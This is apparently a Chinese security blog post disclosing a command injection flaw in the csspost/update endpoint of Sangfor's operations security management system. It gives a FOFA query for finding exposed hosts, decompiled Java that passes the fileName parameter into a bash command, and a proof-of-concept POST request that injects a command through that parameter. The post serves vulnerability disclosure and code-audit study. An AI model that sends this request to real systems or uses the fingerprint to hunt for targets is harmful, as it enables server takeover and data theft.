---
title: "深信服运维安全管理系统 csspost/update 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html
asset_dir: assets/深信服运维安全管理系统-csspostupdate-远程命令执行漏洞
---

# 深信服运维安全管理系统 csspost/update 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/8 08:41
- 203浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

软件

SQL

服务器

---

# 漏洞简介

深信服运维安全管理系统 csspost/update 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.foreignSXF.newSXF.CsspController#update`的实现逻辑

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-001-5b4c3175a832.webp)](https://image.mrxn.net/f5fc7742685d4586ae6d57d91a3d5386.webp)

```
public String update(HttpServletRequest request) throws Exception {
    this.getPatchByNode(request); // 调用 getPatchByNode 方法，可能初始化了一些 Node 对象
    String result = "";
    String fileName = this.getParameter("fileName"); // 从请求中获取 fileName 参数

    // ... 获取 NodeList 和 Node 对象
    // ... 获取 nodeId

    String cmd = "";
    // 构造 shell 命令
    cmd = "bash /usr/local/bin/sh/node_patch_management.sh install " + fileName; 

    // ... 更新 lastUpdateDate

    boolean flag = true;
    // 检查资源名称是否为 "本机" (可能指的是本地节点)
    if ("本机".equals(node.getResourceName())) { 
        ShellExecutor executor = new ShellExecutor();
        OutMessage exe = executor.exec(cmd); // 执行 cmd

        if ("success".equals(exe.getOutStr())) {
            // ... 更新状态
            // ... 异步重启 Tomcat (调用 this.restart())
            this.Rexcecutor.submit(new Runnable() {
                public void run() {
                    try {
                        Thread.sleep(5000L);
                        CsspController.this.restart(); // 调用 restart() 方法
                    } catch (Exception var2) {
                        throw new RuntimeException("重启Tomcat失败!!");
                    }
                }
            });
        } else {
            // ... 处理失败逻辑
            result = "安装失败";
        }
    }

    return result;
}

// restart 方法
public void restart() {
    String cmd = "bash /usr/local/bin/sh/double/restart_tomcat.sh";
    ShellExecutor executor = new ShellExecutor();
    executor.exec(cmd);
}
```

深入探索

网络安全会议

安全认证考试

网络安全课程

总体来说就是

- `fileName` 参数是从用户请求中获取的，用户可控。
- 该参数被直接拼接进了 `cmd` 字符串：`cmd = "bash /usr/local/bin/sh/node_patch_management.sh install " + fileName;`
- 随后，这个 `cmd` 字符串被 `ShellExecutor.exec(cmd)` 执行。
- 由于没有对 `fileName` 进行任何安全过滤或转义，攻击者可以通过在 `fileName` 中插入命令分隔符（如 `;`, `$()`, ``` `` 或 ```||`）来[执行任意系统命令](https://mrxn.net/tag/rce)。

需要满足条件：`if ("本机".equals(node.getResourceName()))` ，一般默认都是满足的

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-002-ca014baaf822.webp)](https://image.mrxn.net/0b027343572a407fadd72c1d5a1495ff.webp)

**/csspost/OSM/update** 亦如此

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-003-e1dadc10e088.webp)](https://image.mrxn.net/8fba6bf22f1349418393517566b7abd6.webp)

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-004-7582cfa7487a.webp)](https://image.mrxn.net/bb2663a3f40e40d884c1d5e36d0171a0.webp)

最终也会导致任意[命令执行](https://mrxn.net/tag/rce)。

# 漏洞复现

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-005-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/csspost;help/update HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=1.zip;RCE_POC
```

访问命令执行结果文件

[![深信服运维安全管理系统 csspost/update 远程命令执行漏洞](images/img-006-67c90b436cf4.webp)](https://image.mrxn.net/ded9db53709b4d7fab92ec0cc007cf67.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
